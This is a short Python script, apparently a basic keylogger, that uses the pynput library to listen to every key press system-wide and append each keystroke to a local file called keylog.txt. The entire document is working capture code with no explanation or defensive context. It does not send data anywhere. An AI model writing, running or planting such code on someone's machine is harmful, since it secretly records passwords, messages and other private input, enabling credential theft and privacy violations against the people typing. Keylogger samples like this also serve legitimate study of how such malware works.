from pynput import keyboard
import logging

def keyPressed(key):
    print(str(key))
    with open ("keylog.txt",'a') as logkey:
        try:
            char=format(key.char)
            logkey.write(char)
            logkey.write('\n')
        except:
            char=format(key)
            logkey.write(char)
            logkey.write('\n')


listener=keyboard.Listener(on_press=keyPressed)
listener.start()
input()
